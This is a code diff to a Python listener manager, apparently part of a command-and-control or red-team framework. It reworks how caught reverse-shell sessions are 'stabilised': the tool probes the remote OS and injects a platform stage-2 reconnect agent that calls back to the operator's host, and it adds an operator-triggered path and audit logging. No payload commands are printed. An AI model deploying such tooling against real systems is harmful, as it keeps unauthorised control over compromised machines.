@@ -465,20 +465,20 @@ class ListenerManager:
 
             out_task = asyncio.create_task(pump_out())
             stabilize_task: asyncio.Task[None] | None = None
-            # Feature flags (optional; default on when unset)
-            do_stabilize = self.auto_stabilize
+            # Auto-stabilize: feature flag is the runtime switch (seeded from settings default OFF)
+            do_stabilize = bool(self.auto_stabilize)
             do_probe = True
             do_filter = True
             if self.feature_check is not None:
                 try:
-                    do_stabilize = do_stabilize and await self.feature_check("shell_auto_stabilize")
+                    do_stabilize = bool(await self.feature_check("shell_auto_stabilize"))
                     do_probe = await self.feature_check("shell_exec_probe")
                     do_filter = await self.feature_check("false_shell_filter")
                 except Exception:
                     pass
             if kind == "reverse_shell" and do_stabilize:
                 stabilize_task = asyncio.create_task(
-                    self._auto_stabilize(sid, cb_host, cb_port),
+                    self._stabilize_session(sid, cb_host, cb_port, delay=True),
                     name=f"stabilize-{sid}",
                 )
             # Verify channel can execute - drop echo-only zombies
@@ -586,63 +586,149 @@ class ListenerManager:
             except Exception:
                 pass
 
-    async def _auto_stabilize(self, session_id: str, host: str, port: int) -> None:
-        """Probe OS then inject platform stage-2 reconnect agent."""
+    async def resolve_callback(self, session_id: str) -> tuple[str, int]:
+        """Public host + listener port for stage-2 reconnect."""
+        writer = self._writers.get(session_id)
+        if writer is None:
+            raise RuntimeError("session has no live TCP channel")
+        srow = await self.db.get_session(session_id)
+        listener_port = 0
+        if srow and srow.get("listener_id"):
+            lrow = await self.db.get_listener(str(srow["listener_id"]))
+            if lrow:
+                listener_port = int(lrow["port"] or 0)
+        return self._callback_host_port(writer, listener_port)
+
+    async def stabilize_session(
+        self,
+        session_id: str,
+        *,
+        os_hint: str | None = None,
+        actor: str = "operator",
+        delay: bool = False,
+    ) -> dict[str, Any]:
+        """Operator one-shot: probe OS (or use hint) and inject Win/Linux stage-2."""
+        if not self.is_live(session_id):
+            raise RuntimeError("session is not a live reverse shell")
+        host, port = await self.resolve_callback(session_id)
+        return await self._stabilize_session(
+            session_id,
+            host,
+            port,
+            os_hint=os_hint,
+            actor=actor,
+            delay=delay,
+            reject_on_noise=False,
+        )
+
+    async def _stabilize_session(
+        self,
+        session_id: str,
+        host: str,
+        port: int,
+        *,
+        os_hint: str | None = None,
+        actor: str = "system",
+        delay: bool = True,
+        reject_on_noise: bool = True,
+    ) -> dict[str, Any]:
+        """Probe OS then inject platform stage-2 reconnect agent (Linux/Windows)."""
         try:
-            await asyncio.sleep(self.stabilize_delay_sec)
+            if delay:
+                await asyncio.sleep(self.stabilize_delay_sec)
             if session_id in self._rejected:
-                return
+                return {"status": "rejected", "session_id": session_id}
 
             early = "".join(self._shell_buffers.get(session_id, [])[-10:])
             if early:
                 v = classify_inbound(early)
                 if not v.is_shell and v.confidence >= 0.8:
-                    await self._reject_session(session_id, v.reason, "stabilize-early")
-                    return
+                    if reject_on_noise:
+                        await self._reject_session(session_id, v.reason, "stabilize-early")
+                        return {"status": "rejected", "reason": v.reason, "session_id": session_id}
+                    return {"status": "error", "reason": v.reason, "session_id": session_id}
 
             if "SC5_STABLE" in early:
                 log.info("Session %s already stable (banner) - skip re-stage", session_id)
-                await self.db.update_session(
-                    session_id,
-                    metadata={"stabilized": True, "stage2": True, "stable_banner": True},
-                )
+                row = await self.db.get_session(session_id)
+                existing: dict[str, Any] = {}
+                if row and row.get("metadata"):
+                    try:
+                        existing = (
+                            json.loads(row["metadata"])
+                            if isinstance(row["metadata"], str)
+                            else dict(row["metadata"])
+                        )
+                    except (json.JSONDecodeError, TypeError):
+                        existing = {}
+                existing.update({"stabilized": True, "stage2": True, "stable_banner": True})
+                await self.db.update_session(session_id, metadata=existing)
                 await self.metrics.emit(
                     "shell.stabilize.skip",
                     {"session_id": session_id, "reason": "already_stable"},
                 )
-                return
+                return {
+                    "status": "already_stable",
+                    "session_id": session_id,
+                    "callback": f"{host}:{port}",
+                }
 
             stabilizer = ShellStabilizer(host, port)
-            await asyncio.sleep(0.3)
+            if delay:
+                await asyncio.sleep(0.3)
             if session_id in self._rejected:
-                return
-            probe = stabilizer.probe_command()
-            await self.send_shell(session_id, probe)
-            await asyncio.sleep(self.probe_wait_sec)
-            if session_id in self._rejected:
-                return
+                return {"status": "rejected", "session_id": session_id}
 
-            blob = "".join(self._shell_buffers.get(session_id, [])[-20:])
-            if blob:
-                v = classify_inbound(blob)
-                if not v.is_shell and v.confidence >= 0.8:
-                    await self._reject_session(session_id, v.reason, "stabilize-probe")
-                    return
+            hint = (os_hint or "").strip().lower()
+            family = "unknown"
+            if hint in ("linux", "unix", "posix"):
+                family = "linux"
+            elif hint in ("windows", "win", "win32"):
+                family = "windows"
+            else:
+                probe = stabilizer.probe_command()
+                await self.send_shell(session_id, probe)
+                await asyncio.sleep(self.probe_wait_sec)
+                if session_id in self._rejected:
+                    return {"status": "rejected", "session_id": session_id}
 
-            if "SC5_STABLE" in blob:
-                log.info("Session %s became stable during probe - skip", session_id)
-                return
+                blob = "".join(self._shell_buffers.get(session_id, [])[-20:])
+                if blob:
+                    v = classify_inbound(blob)
+                    if not v.is_shell and v.confidence >= 0.8:
+                        if reject_on_noise:
+                            await self._reject_session(session_id, v.reason, "stabilize-probe")
+                            return {"status": "rejected", "reason": v.reason, "session_id": session_id}
+                        return {"status": "error", "reason": v.reason, "session_id": session_id}
 
-            family = detect_os(blob)
+                if "SC5_STABLE" in blob:
+                    log.info("Session %s became stable during probe - skip", session_id)
+                    return {
+                        "status": "already_stable",
+                        "session_id": session_id,
+                        "callback": f"{host}:{port}",
+                    }
+
+                family = detect_os(blob)
+                # Prefer session os_info when probe is ambiguous
+                if family == "unknown":
+                    srow = await self.db.get_session(session_id)
+                    oi = ((srow or {}).get("os_info") or "").lower()
+                    if "win" in oi:
+                        family = "windows"
+                    elif "linux" in oi or "unix" in oi or "darwin" in oi:
+                        family = "linux"
+
             plan = stabilizer.plan(family)
 
             log.info(
-                "Stabilizing session %s as %s via %s (callback %s:%s)",
+                "Stabilizing session %s as %s via %s (callback %s:%s) actor=%s",
                 session_id,
                 plan.os_family,
                 plan.method,
                 host,
                 port,
+                actor,
             )
             await self.metrics.emit(
                 "shell.stabilize.start",
@@ -651,12 +737,13 @@ class ListenerManager:
                     "os": plan.os_family,
                     "method": plan.method,
                     "callback": f"{host}:{port}",
+                    "actor": actor,
                 },
             )
 
             for cmd in plan.commands:
                 if session_id in self._rejected:
-                    return
+                    return {"status": "rejected", "session_id": session_id}
                 ok = await self.send_shell(session_id, cmd)
                 if not ok:
                     break
@@ -664,15 +751,17 @@ class ListenerManager:
 
             meta = {
                 "stabilized": True,
+                "stage2": True,
                 "stabilize_os": plan.os_family,
                 "stabilize_method": plan.method,
                 "stabilize_callback": f"{host}:{port}",
                 "stabilize_notes": plan.notes,
+                "stabilize_actor": actor,
             }
             row = await self.db.get_session(session_id)
             if not row:
-                return
-            existing: dict[str, Any] = {}
+                return {"status": "error", "reason": "session_gone", "session_id": session_id}
+            existing = {}
             if row.get("metadata"):
                 try:
                     existing = (
@@ -693,18 +782,27 @@ class ListenerManager:
                 {"session_id": session_id, "os": plan.os_family, "method": plan.method},
             )
             await self.db.audit(
-                actor="system",
-                actor_type="system",
+                actor=actor,
+                actor_type="operator" if actor != "system" else "system",
                 action="shell.stabilize",
                 resource=session_id,
                 details=meta,
                 risk_score=4,
             )
+            return {
+                "status": "stabilized",
+                "session_id": session_id,
+                "os": plan.os_family,
+                "method": plan.method,
+                "callback": f"{host}:{port}",
+                "notes": plan.notes,
+            }
         except asyncio.CancelledError:
             raise
-        except Exception:
-            log.exception("Auto-stabilize failed for %s", session_id)
+        except Exception as e:
+            log.exception("Stabilize failed for %s", session_id)
             await self.metrics.emit("shell.stabilize.error", {"session_id": session_id})
+            raise RuntimeError(str(e) or "stabilize failed") from e
 
     def is_live(self, session_id: str) -> bool:
         """True only while a TCP reverse-shell channel is attached in this process."""
